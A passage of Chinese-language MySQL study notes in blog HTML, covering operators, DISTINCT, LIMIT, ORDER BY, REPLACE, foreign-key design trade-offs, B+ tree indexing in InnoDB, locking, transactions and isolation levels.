||</td><td>逻辑或</td></tr><tr><td>XOR</td><td>逻辑异或</td></tr></tbody></table><h4 id="逻辑位运算符"><a href="#逻辑位运算符" class="headerlink" title="逻辑位运算符"></a>逻辑位运算符</h4><table><thead><tr><th>运算符</th><th>作用</th></tr></thead><tbody><tr><td>NOT 或者 !</td><td>逻辑非</td></tr><tr><td>AND 或者 &amp;&amp;</td><td>逻辑与</td></tr><tr><td>OR 和 ||</td><td>逻辑或</td></tr><tr><td>XOR</td><td>逻辑异或</td></tr></tbody></table><h4 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h4><table><thead><tr><th>优先级由低到高排列</th><th>运算符</th></tr></thead><tbody><tr><td>1</td><td>=(赋值运算）、:=</td></tr><tr><td>2</td><td>II、OR</td></tr><tr><td>3</td><td>XOR</td></tr><tr><td>4</td><td>&amp;&amp;、AND</td></tr><tr><td>5</td><td>NOT</td></tr><tr><td>6</td><td>BETWEEN、CASE、WHEN、THEN、ELSE</td></tr><tr><td>7</td><td>=(比较运算）、&lt;=&gt;、&gt;=、&gt;、&lt;=、&lt;、&lt;&gt;、!=、 IS、LIKE、REGEXP、IN</td></tr><tr><td>8</td><td>|</td></tr><tr><td>9</td><td>&amp;</td></tr><tr><td>10</td><td>&lt;&lt;、&gt;&gt;</td></tr><tr><td>11</td><td>-(减号）、+</td></tr><tr><td>12</td><td>*、/、%</td></tr><tr><td>13</td><td>^</td></tr><tr><td>14</td><td>-(负号）、〜（位反转）</td></tr><tr><td>15</td><td>!</td></tr></tbody></table><h3 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h3><p>为了实现查询不重复的数据，MySQL提供了DISTINCT关键字</p><p>DISTINCT关键字的主要作用就是对数据表中一个或多个自读那重复的数据进行过滤，只返回其中的一条数据给用户</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> &lt;字段名&gt;<span class="keyword">FROM</span>&lt;表名&gt;；</span><br><span class="line">字段名 为消除重复记录的字段名称，多个字段时用逗号隔开</span><br></pre></td></tr></table></figure><p>使用 DISTINCT 关键字时需要注意以下几点：</p><ul><li><p>DISTINCT 关键字只能在 SELECT 语句中使用。</p></li><li><p>在对一个或多个字段去重时，DISTINCT 关键字必须在所有字段的最前面。</p></li><li><p>如果 DISTINCT 关键字后有多个字段，则会对多个字段进行组合去重，也就是说，只有多个字段组合起来完全是一样的情况下才会被去重。</p></li><li><p>因为 DISTINCT 只能返回它的目标字段，而无法返回其它字段，所以在实际情况中，我们经常使用 DISTINCT 关键字来返回不重复字段的条数。</p></li></ul><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20210501180404500.png" alt="image-20210501180404500"></p><p>第二条sql语句会将 customer中所有的重复数据都删除,一条不留 </p><p><strong>保留一条</strong></p><p> 排除其中一条的某个参数, id最大或 最小 </p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20210501182226551.png" alt="image-20210501182226551"></p><p>保留id最大的数据 </p><h3 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 初始位置</span><br><span class="line">LIMIT <span class="number">3</span>,<span class="number">5</span>; 从第<span class="number">4</span>条记录开始的行数为<span class="number">5</span>的记录</span><br><span class="line">LIMIT 记录数</span><br><span class="line">sql查询语句 LIMIT <span class="number">15</span>; 指定显示<span class="number">15</span>条记录</span><br><span class="line">LIMIT <span class="number">5</span> OFFSET <span class="number">3</span> ; 返回从第<span class="number">4</span>条记录开始的行数为<span class="number">5</span>的记录</span><br></pre></td></tr></table></figure><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> &lt;字段名&gt; [<span class="keyword">ASC</span>|<span class="keyword">DESC</span>]  将查询结果中的数据按照一定的顺序进行排序</span><br></pre></td></tr></table></figure><p>语法说明如下。</p><ul><li>字段名：表示需要排序的字段名称，多个字段时用逗号隔开。</li><li>ASC|DESC：<code>ASC</code>表示字段按升序排序；<code>DESC</code>表示字段按降序排序。其中<code>ASC</code>为默认值。</li></ul><p>使用 ORDER BY 关键字应该注意以下几个方面：</p><ul><li>ORDER BY 关键字后可以跟子查询（关于子查询后面教程会详细讲解，这里了解即可）。</li><li>当排序的字段中存在空值时，ORDER BY 会将该空值作为最小值来对待。</li><li>ORDER BY 指定多个字段进行排序时，MySQL 会按照字段的顺序从左到右依次进行排序。语法说明如下。</li></ul><p>指定多个字段时，按照字段名在sql居于中的先后顺序进行排序</p><p><strong>注意</strong>：在对多个字段进行排序时，排序的第一个字段必须有相同的值，才会对第二个字段进行排序。如果第一个字段数据中所有的值都是唯一的，MySQL 将不再对第二个字段进行排序。</p><h3 id="REPLACE"><a href="#REPLACE" class="headerlink" title="REPLACE"></a>REPLACE</h3><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20210505093116822.png" alt="image-20210505093116822"></p><p>用法</p><p>(1) 同insert</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//含义一</span></span><br><span class="line"><span class="selector-tag">REPLACE</span> <span class="selector-tag">INTO</span> <span class="selector-tag">score</span>(change_type,scope, score, user_id) <span class="selector-tag">VALUES</span>(<span class="string">'吃饭'</span>,<span class="number">10</span>,<span class="number">1</span><span class="string">'),('</span>喝茶<span class="string">',10,1),('</span>喝茶',<span class="number">10</span>,<span class="number">1</span>);  </span><br><span class="line"><span class="comment">//含义二</span></span><br><span class="line"><span class="selector-tag">REPLACE</span> <span class="selector-tag">INTO</span> <span class="selector-tag">score</span>(id,change_type,score,user_id) <span class="selector-tag">VALUES</span>(<span class="number">1</span>,<span class="string">'吃饭'</span>,<span class="number">10</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>此语句的作用是向表table中插入3条记录。如果主键id为1或2不存在就相当于插入语句：</p><p>INSERTINTO score (change_type,score,user_id) VALUES (‘吃饭’,10,1),(‘喝茶’,10,1),(‘喝茶’,10,1);</p><p>如果存在相同的值则不会插入数据。</p><p>(2) replace(object, serchmreplace),把object出现search的全部替换为replace</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用法一: 并不是修改数据, 而只是单纯做局部替换数据返回而已 </span></span><br><span class="line"><span class="keyword">SELECT</span> REPLACE(<span class="string">'喝茶'</span>,<span class="string">'茶'</span>,<span class="string">'喝'</span>)</span><br><span class="line"><span class="comment">//结果: 喝喝</span></span><br></pre></td></tr></table></figure><p>用法二 修改表数据, </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> score <span class="keyword">SET</span> change_type=REPLACE(change_type,<span class="string">'做任务'</span>,<span class="string">'bb'</span>)  //bb替换 作任务</span><br></pre></td></tr></table></figure><p>update 和replace的区别 </p><p>1）UPDATE在没有匹配记录时什么都不做，而REPLACE在有重复记录时更新，在没有重复记录时插入。</p><p>2）UPDATE可以选择性地更新记录的一部分字段。而REPLACE在发现有重复记录时就将这条记录彻底删除，再插入新的记录。也就是说，将所有的字段都更新了。</p><p>其实REPLACE更像INSERT与DELETE的结合。</p><h2 id="原理性与mysql-设计"><a href="#原理性与mysql-设计" class="headerlink" title="原理性与mysql 设计"></a>原理性与mysql 设计</h2><h3 id="三大范式"><a href="#三大范式" class="headerlink" title="三大范式"></a>三大范式</h3><h4 id="1NF-第一范式"><a href="#1NF-第一范式" class="headerlink" title="1NF(第一范式)"></a>1NF(第一范式)</h4><p>属性（对应于表中的字段）不能再被分割，也就是这个字段只能是一个值，不能再分为多个其他的字段了。<strong>1NF是所有关系型数据库的最基本要求</strong> ，也就是说关系型数据库中创建的表一定满足第一范式。</p><h4 id="2NF-第二范式"><a href="#2NF-第二范式" class="headerlink" title="2NF(第二范式)"></a>2NF(第二范式)</h4><h3 id="唯一约束和联合唯一约束"><a href="#唯一约束和联合唯一约束" class="headerlink" title="唯一约束和联合唯一约束"></a>唯一约束和联合唯一约束</h3><h3 id="不使用外键与级联-一切外键概念必须在应用层解决"><a href="#不使用外键与级联-一切外键概念必须在应用层解决" class="headerlink" title="不使用外键与级联,一切外键概念必须在应用层解决"></a>不使用外键与级联,一切外键概念必须在应用层解决</h3><p>互联网行业应用 用户量大, 并发高, 数据库容易成为性能瓶颈, 尤其收IO限制, 此时不用外键,把数据一致性的控制放到业务中,易于水平扩展 </p><p>传统行业 软件应用的用户数有限, 不考虑数据库性能问题</p><h3 id="模拟外键"><a href="#模拟外键" class="headerlink" title="模拟外键"></a>模拟外键</h3><p>需要遵循的原则</p><ul><li>向表中插入数据或者修改表中的数据时，都应该执行额外的 <code>SELECT</code> 语句确保它引用的数据在数据库中存在；</li><li>在删除数据之前需要执行额外的 <code>SELECT</code> 语句检查是否存在当前记录的引用；</li></ul><p>插入或者 修改posts 表 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">authors</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = &lt;post.author_id&gt; <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</span><br><span class="line"><span class="comment">-- INSERT INTO posts ... / UPDATE posts ...</span></span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure><p>但是如果我们要删除 <code>authors</code> 表中的数据，就需要查询所有引用 <code>authors</code> 数据的表；如果有 10 个表都有指向 <code>authors</code> 表的外键，我们就需要在 10 个表中查询是否存在对应的记录，这个过程相对比较麻烦，不过也是为了实现完整性的必要代价，不过这种模拟外键方法其实远比使用外键更消耗资源，它不仅需要查询关联数据，还要通过网络发送更多的数据包。</p><p>模拟外键的使用会带来更大的额外开销, 但能降低对数据库性能瞬时影响,提高数据库性能</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>外键提供的几种在更新和删除时的不同行为都可以帮助我们保证数据库中数据的一致性和引用合法性，但是外键的使用也需要数据库承担额外的开销，在大多数服务都可以水平扩容的今天，高并发场景中使用外键确实会影响服务的吞吐量上限。在数据库之外手动实现外键的功能是可能的，但是却会带来很多维护上的成本或者需要我们在数据一致性上做出一些妥协。我们可以从可用性、一致性几个方面分析使用外键、模拟外键以及不使用外键的差异：</p><ul><li>不使用外键牺牲了数据库中数据的一致性，但是却能够减少数据库的负载；</li><li>模拟外键将一部分工作移到了数据库之外，我们可能需要放弃一部分一致性以获得更高的可用性，但是为了这部分可用性，我们会付出更多的研发与维护成本，也增加了与数据库之间的网络通信次数；</li><li>使用外键保证了数据库中数据的一致性，也将全部的计算任务全部交给了数据库；</li></ul><p>在大多数不需要高并发或者对一致性有较强要求的系统中，我们可以直接使用数据库提供的外键帮助我们对数据进行校验，但是在对一致性要求不高的、复杂的场景或者大规模的团队中，不使用外键也确实可以为数据库减负，而大团队也有更多的时间和精力去设计其他的方案，例如：分布式的关系型数据库。</p><p>当我们考虑应不应该在数据库中使用外键时，需要关注的核心我们的数据库承担这部分计算任务后会不会影响系统的可用性，在使用时也<strong>不应该一刀切</strong>的决定用或者不用外键，应该根据具体的场景做决策，我们在这里介绍了两个使用外键时可能遇到的问题：</p><ul><li><code>RESTRICT</code> 外键会在更新和删除关系表中的数据时对外键约束的合法性进行检查，保证外键不会引用到不存在的记录；</li><li><code>CASCADE</code> 外键会在更新和删除关系表中的数据时触发对关联记录的更新和删除，在数据量较大的数据库中可能会有数量级的放大效果；</li></ul><p>我们在很多时候其实并不能选择是否使用外键，大多数公司的 DBA 都会对数据库系统的使用有比较明确的规定，但是我们要清楚做出使用外键和不使用外键这一抉择的原因。到最后，我们还是来看一些比较开放的相关问题，有兴趣的读者可以仔细思考一下下面的问题：</p><ul><li>数据库中还有哪些特性是我们在生产环境中不会使用的？为什么？</li><li>分布式的关系型数据库与 MySQL 等传统数据库有哪些区别？</li></ul><h3 id="分布式的关系型数据库与MySQL等传统数据库的区别"><a href="#分布式的关系型数据库与MySQL等传统数据库的区别" class="headerlink" title="分布式的关系型数据库与MySQL等传统数据库的区别"></a>分布式的关系型数据库与MySQL等传统数据库的区别</h3><h3 id="默认引擎InnoDB"><a href="#默认引擎InnoDB" class="headerlink" title="默认引擎InnoDB"></a>默认引擎InnoDB</h3><p>使用B+树, 不使用B树和哈希的原因 </p><ul><li>InnoDB 需要支持的场景和功能需要在特定查询上拥有较强的性能；</li><li>CPU 将磁盘上的数据加载到内存中需要花费大量的时间，这使得 B+ 树成为了非常好的选择；</li></ul><p>数据的持久化以及持久化数据的查询其实是一个常见的需求，而数据的持久化就需要我们与磁盘、内存和 CPU 打交道；MySQL 作为 OLTP 的数据库不仅需要具备事务的处理能力，而且要保证数据的持久化并且能够有一定的实时数据查询能力，这些需求共同决定了 B+ 树的选择，接下来我们会详细分析上述两个原因背后的逻辑。</p><h4 id="读写性能"><a href="#读写性能" class="headerlink" title="读写性能"></a>读写性能</h4><p>与 OLTP 相比的还有 OLAP，它们分别是 Online Transaction Processing 和 Online Analytical Processing，从这两个名字中我们就可以看出，前者指的就是传统的关系型数据库，主要用于处理基本的、日常的事务处理，而后者主要在数据仓库中使用，用于支持一些复杂的分析和决策。</p><p>InnoDB存储引擎支持 OlTP 数据库 , 其常用工作</p><ul><li>通过 <code>INSERT</code>、<code>UPDATE</code> 和 <code>DELETE</code> 语句对表中的数据进行增加、修改和删除；</li><li>通过 <code>UPDATE</code> 和 <code>DELETE</code> 语句对符合条件的数据进行批量的删除；</li><li>通过 <code>SELECT</code> 语句和主键查询某条记录的全部列；</li><li>通过 <code>SELECT</code> 语句在表中查询符合某些条件的记录并根据某些字段排序；</li><li>通过 <code>SELECT</code> 语句查询表中数据的行数；</li><li>通过唯一索引保证表中某个字段或者某几个字段的唯一性；</li></ul><p>使用B+树作为底层数据结构时 那么所有只会访问或者修改一条数据的 SQL 的时间复杂度都是 <code>O(log n)</code>，也就是树的高度，但是使用哈希却有可能达到 <code>O(1)</code> 的时间复杂度，看起来是不是特别的美好。但是当我们使用如下所示的 SQL 时，哈希的表现就不会这么好了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> posts <span class="keyword">WHERE</span> author = <span class="string">'draven'</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> created_at <span class="keyword">DESC</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> posts <span class="keyword">WHERE</span> comments_count &gt; <span class="number">10</span></span><br><span class="line"><span class="keyword">UPDATE</span> posts <span class="keyword">SET</span> github = <span class="string">'github.com/draveness'</span> <span class="keyword">WHERE</span> author = <span class="string">'draven'</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> posts <span class="keyword">WHERE</span> author = <span class="string">'draven'</span></span><br></pre></td></tr></table></figure><p>如果我们使用哈希作为底层的数据结构，遇到上述的场景时，使用哈希构成的主键索引或者辅助索引可能就没有办法快速处理了，它对于处理范围查询或者排序性能会非常差，只能进行全表扫描并依次判断是否满足条件。全表扫描对于数据库来说是一个非常糟糕的结果，这其实也就意味着我们使用的数据结构对于这些查询没有其他任何效果，最终的性能可能都不如从日志中顺序进行匹配。</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/log-as-database.png" alt="log-as-database"></p><p>使用 B+ 树其实能够保证数据按照键的顺序进行存储，也就是相邻的所有数据其实都是按照自然顺序排列的，使用哈希却无法达到这样的效果，因为哈希函数的目的就是让数据尽可能被分散到不同的桶中进行存储，所以在遇到可能存在相同键 <code>author = &#39;draven</code> 或者排序以及范围查询 <code>comments_count &gt; 10</code> 时，由哈希作为底层数据结构的表可能就会面对数据库查询的噩梦 —— 全表扫描。</p><p>B 树和 B+ 树在数据结构上其实有一些类似，它们都可以按照某些顺序对索引中的内容进行遍历，对于排序和范围查询等操作，B 树和 B+ 树相比于哈希会带来更好的性能，当然如果索引建立不够好或者 SQL 查询非常复杂，依然会导致全表扫描。</p><p>与 B 树和 B+ 树相比，哈希作为底层的数据结构的表能够以 <code>O(1)</code> 的速度处理单个数据行的增删改查，但是面对范围查询或者排序时就会导致全表扫描的结果，而 B 树和 B+ 树虽然在单数据行的增删查改上需要 <code>O(log n)</code> 的时间，但是它会将索引列相近的数据按顺序存储，所以能够避免全表扫描。</p><h4 id="数据加载"><a href="#数据加载" class="headerlink" title="数据加载"></a>数据加载</h4><p>使用哈希无法应对我们常见的SQL中排序和范围查询等操作, b树和b+树都可以 . </p><p>计算机在读写文件时会以页为单位将数据加载到内存中。页的大小可能会根据操作系统的不同而发生变化，不过在大多数的操作系统中，页的大小都是 `4KB</p><p>B 树与 B+ 树的最大区别就是，B 树可以在非叶结点中存储数据，但是 B+ 树的所有数据其实都存储在叶子节点中，当一个表底层的数据结构是 B 树时，假设我们需要访问所有『大于 4，并且小于 9 的数据』：</p><h2 id="锁机制"><a href="#锁机制" class="headerlink" title="锁机制"></a>锁机制</h2><p><a href="https://blog.csdn.net/Jack__Frost/article/details/73347688" target="_blank" rel="noopener">参考</a></p><p>使用锁机制对mysql语句进行优化 ,涉及到mysql 锁使用的时候一般在并发比较高时 </p><p>锁是计算机 协调多个进程或纯线程并发访问某一资源的机制 .在数据库中, 除传统的计算资源（CPU、RAM、I/O）的争用以外，数据也是一种供许多用户共享的资源。如何保证数据并发访问的一致性、有效性是所在有数据库必须解决的一个问题，锁冲突也是影响数据库并发访问性能的一个重要因素。从这个角度来说，锁对数据库而言显得尤其重要，也更加复杂。</p><p>防止更新丢失, 并不能单靠数据库事务控制器来解决, 需要应用程序对要更新的数据加必要的锁来解决</p><p>Thread T 将B加锁, 解锁后才能被其它thread 访问 </p><p>事务 T将某个数据对象(表, 记录)操作之前, 先向系统发出请求, 对其加锁, 加锁后事务T就对数据库对象有一定的控制，在事务T释放它的锁之前，其他事务不能更新此数据对象。 </p><h3 id="锁定机制分类"><a href="#锁定机制分类" class="headerlink" title="锁定机制分类"></a>锁定机制分类</h3><p>锁定机制就是数据库为了保证数据的一致性而使各种共享资源在被并发访问访问变得有序所设计的一种规则。MySQL数据库由于其自身架构的特点，存在多种数据存储引擎，每种存储引擎所针对的应用场景特点都不太一样，为了满足各自特定应用场景的需求，每种存储引擎的锁定机制都是为各自所面对的特定场景而优化设计，所以各存储引擎的锁定机制也有较大区别。</p><h4 id="排他锁-又称写锁-X锁"><a href="#排他锁-又称写锁-X锁" class="headerlink" title="排他锁(又称写锁, X锁)"></a>排他锁(又称写锁, X锁)</h4><p>会阻塞其它事务读和写</p><p>若事务T对数据对象A加上X锁，则只允许T读取和修改A，其他任何事务都不能再对加任何类型的锁，知道T释放A上的锁。这就保证了其他事务在T释放A上的锁之前不能再读取和修改A。</p><h4 id="共享锁-又成读取-S锁"><a href="#共享锁-又成读取-S锁" class="headerlink" title="共享锁(又成读取,S锁)"></a>共享锁(又成读取,S锁)</h4><p>会阻塞其他事务修改表数据。</p><p>若事务T对数据对象A加上S锁，则其他事务只能再对A加S锁，而不能X锁，直到T释放A上的锁。这就保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。</p><p>X锁和S锁都是加载某一个数据对象上的。也就是数据的粒度。</p><h4 id="行级锁定-row-level"><a href="#行级锁定-row-level" class="headerlink" title="行级锁定(row-level)"></a>行级锁定(row-level)</h4><p>行级锁: 开销大, 枷锁慢;  会出现死锁; 锁定粒读最小, 发生锁冲突的概率最低,并发度也最高 </p><p><strong>详细：</strong>行级锁定最大的特点就是锁定对象的颗粒度很小，也是目前各大数据库管理软件所实现的锁定颗粒度最小的。由于锁定颗粒度很小，所以发生锁定资源争用的概率也最小，能够给予应用程序尽可能大的并发处理能力而提高一些需要高并发应用系统的整体性能。</p><p><strong>缺陷：</strong>由于锁定资源的颗粒度很小，所以每次获取锁和释放锁需要做的事情也更多，带来的消耗自然也就更大了。此外，行级锁定也最容易发生死锁。</p><h4 id="表级锁定-table-level"><a href="#表级锁定-table-level" class="headerlink" title="表级锁定(table-level)"></a>表级锁定(table-level)</h4><p>表级锁:开销小, 枷锁快;不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低</p><p><strong>详细：</strong>和行级锁定相反，表级别的锁定是MySQL各存储引擎中最大颗粒度的锁定机制。该锁定机制最大的特点是实现逻辑非常简单，带来的系统负面影响最小。所以获取锁和释放锁的速度很快。由于表级锁一次会将整个表锁定，所以可以很好的避免困扰我们的死锁问题。</p><p><strong>缺陷：</strong>锁定颗粒度大所带来最大的负面影响就是出现锁定资源争用的概率也会最高，致使并发度大打折扣。</p><h4 id="页级锁定-page-level-MySQL特有"><a href="#页级锁定-page-level-MySQL特有" class="headerlink" title="页级锁定(page-level) (MySQL特有)"></a>页级锁定(page-level) (MySQL特有)</h4><p>页级锁: 开销和枷锁时间届于表锁和行锁之间; 会出现死锁,锁定粒度大, 发生锁冲突的概率最高, 并发度一般</p><p><strong>详细：</strong>页级锁定是MySQL中比较独特的一种锁定级别，在其他数据库管理软件中也并不是太常见。页级锁定的特点是锁定颗粒度介于行级锁定与表级锁之间，所以获取锁定所需要的资源开销，以及所能提供的并发处理能力也同样是介于上面二者之间。</p><p><strong>缺陷：</strong>页级锁定和行级锁定一样，会发生死锁。</p><p>从这里我们应该引申去思考行锁更多的缺点：（因为我们执行sql主要依赖行锁来提高并发度）<br>1- 比表级锁、页级锁消耗更多内存<br>2- 如果你在大部分数据上经常进行GROUP BY操作或者必须经常扫描整个表，比其它锁定明显慢很多。<br>3- 更容易发生死锁。</p><h3 id="事务机制"><a href="#事务机制" class="headerlink" title="事务机制"></a>事务机制</h3><p>事务简称ACID. 是恢复和并发控制的基本单位 </p><p>A 事务的原子性(Atomicity)：<br>指一个事务要么全部执行,要么不执行.也就是说一个事务不可能只执行了一半就停止了.比如你从取款机取钱,这个事务可以分成两个步骤:1划卡,2出钱.不可能划了卡,而钱却没出来.这两步必须同时完成.要么就不完成.</p><p>C 事务的一致性(Consistency)：<br>指事务的运行并不改变数据库中数据的一致性.例如,完整性约束了a+b=10,一个事务改变了a,那么b也应该随之改变.</p><p>I 独立性(Isolation）:<br>事务的独立性也有称作隔离性,是指两个以上的事务不会出现交错执行的状态.因为这样可能会导致数据不一致.</p><p>D 持久性(Durability）:<br>事务的持久性是指事务执行成功以后,该事务所对数据库所作的更改便是持久的保存在数据库之中，不会无缘无故的回滚.</p><h3 id="事务锁"><a href="#事务锁" class="headerlink" title="事务锁"></a>事务锁</h3><p>首先来看两个事务的写操作之间的相互影响。隔离性要求同一时刻只能有一个事务对数据进行写操作，InnoDB通过锁机制来保证这一点。</p><p>锁机制的基本原理可以概括为：事务在修改数据之前，需要先获得相应的锁；获得锁之后，事务便可以修改数据；该事务操作期间，这部分数据是锁定的，其他事务如果需要修改数据，需要等待当前事务提交或回滚后释放锁。</p><p><strong>行锁与表锁</strong></p><p>按照粒度，锁可以分为表锁、行锁以及其他位于二者之间的锁。表锁在操作数据时会锁定整张表，并发性能较差；行锁则只锁定需要操作的数据，并发性能好。但是由于加锁本身需要消耗资源(获得锁、检查锁、释放锁等都需要消耗资源)，因此在锁定数据较多情况下使用表锁可以节省大量资源。MySQL中不同的存储引擎支持的锁是不一样的，例如MyIsam只支持表锁，而InnoDB同时支持表锁和行锁，且出于性能考虑，绝大多数情况下使用的都是行锁。</p><p>查看锁信息 </p><p>需要先加锁, 分类性锁 表锁或行级锁</p><h3 id="事务引起的并发调度问题"><a href="#事务引起的并发调度问题" class="headerlink" title="事务引起的并发调度问题"></a>事务引起的并发调度问题</h3><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>事务(Transaction) 是访问和更新数据库的程序执行单元; 事务中可能包含一个或sql 语句, 这些语句要么都执行, 要么都不执行. 作为一个关系型数据库, MySQL事务的基础知识</p><h3 id="逻辑架构和存储引擎"><a href="#逻辑架构和存储引擎" class="headerlink" title="逻辑架构和存储引擎"></a>逻辑架构和存储引擎</h3><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128200647649-2138221098.png" alt="img"></p><p>图片来源：<a href="https://blog.csdn.net/fuzhongmin05/article/details/70904190" target="_blank" rel="noopener">https://blog.csdn.net/fuzhongmin05/article/details/70904190</a></p><p>如上图所示，MySQL服务器逻辑架构从上往下可以分为三层：</p><p>（1）第一层：处理客户端连接、授权认证等。</p><p>（2）第二层：服务器层，负责查询语句的解析、优化、缓存以及内置函数的实现、存储过程等。</p><p>（3）第三层：存储引擎，负责MySQL中数据的存储和提取。<strong>MySQL**</strong>中服务器层不管理事务，事务是由存储引擎实现的。**MySQL支持事务的存储引擎有InnoDB、NDB Cluster等，其中InnoDB的使用最为广泛；其他存储引擎不支持事务，如MyIsam、Memory等。</p><p>如无特殊说明，后文中描述的内容都是基于InnoDB。</p><h3 id="提交和回滚"><a href="#提交和回滚" class="headerlink" title="提交和回滚"></a>提交和回滚</h3><p>典型的MySQL事务是如下操作的:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">start</span> <span class="keyword">transaction</span>;</span><br><span class="line">……  <span class="comment">#一条或多条sql语句</span></span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure><p>其中start trnsaction标志事务开始,commit提交事务, 将执行结果写入到数据库,如果sql 语句执行出现问题, 会调用rollaback, 回滚所有已经执行成功的sql 语句. 当然,也可以在事务中直接使用rollback 语句进行回滚</p><p>自动提交 </p><p>MySQL中默认采用的是自动提交（autocommit）模式，如下所示：</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128200732629-417401931.png" alt="img"></p><p>在自动提交模式下，如果没有start transaction显式地开始一个事务，那么每个sql语句都会被当做一个事务执行提交操作。</p><p>通过如下方式，可以关闭autocommit；需要注意的是，autocommit参数是针对连接的，在一个连接中修改了参数，不会对其他连接产生影响。</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128200751635-466164258.png" alt="img"></p><p>如果关闭了autocommit，则所有的sql语句都在一个事务中，直到执行了commit或rollback，该事务结束，同时开始了另外一个事务。</p><p><strong>特殊操作</strong></p><p>在MySQL中，存在一些特殊的命令，如果在事务中执行了这些命令，会马上强制执行commit提交事务；如DDL语句(create table/drop table/alter/table)、lock tables语句等等。</p><p>不过，常用的select、insert、update和delete命令，都不会强制提交事务。</p><p>关于<a href="http://www.xwood.net/_site_domain_/_root/5870/5930/5932/t_c257586.html" target="_blank" rel="noopener">mysql</a>的不同分布式事务交互存在三种问题：脏读、不可重复读、幻读，<a href="http://www.xwood.net/_site_domain_/_root/5870/5930/5932/t_c257586.html" target="_blank" rel="noopener">mysql</a>根据不同应用场景设置不同的隔离级别（如下表格四种不同隔离级别，每个级别分别对应解决问题说明），默认设置为可重复读（repeatable-read）。</p><table><thead><tr><th><strong>事务隔离级别</strong></th><th><strong>脏读</strong></th><th><strong>不可重复读</strong></th><th><strong>幻读</strong></th></tr></thead><tbody><tr><td>读未提交（read-uncommitted）</td><td>是</td><td>是</td><td>是</td></tr><tr><td>不可重复读（read-committed）</td><td>否</td><td>是</td><td>是</td></tr><tr><td>可重复读（repeatable-read）</td><td>否</td><td>否</td><td>是</td></tr><tr><td>串行化（serializable）</td><td>否</td><td>否</td><td>否</td></tr></tbody></table><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">A</span>、事务的基本要素（ACID）</span><br><span class="line"></span><br><span class="line"> 　　<span class="number">1</span>、原子性（Atomicity）：一个事务必须操作完成，不会停滞在中间环节，执行过程出错，回滚到事务开始前的状态。该事务是一个不可分割的整体-如化学中学过的原子，是物质构成的基本单位。</span><br><span class="line">　　 </span><br><span class="line">　　 <span class="number">2</span>、一致性（Consistency）：事务开始前和结束后，数据库的完整性约束没有被破坏 。比如<span class="keyword">A</span>向B转账，不可能<span class="keyword">A</span>扣了钱，B却没收到。</span><br><span class="line">　　 </span><br><span class="line">　　 <span 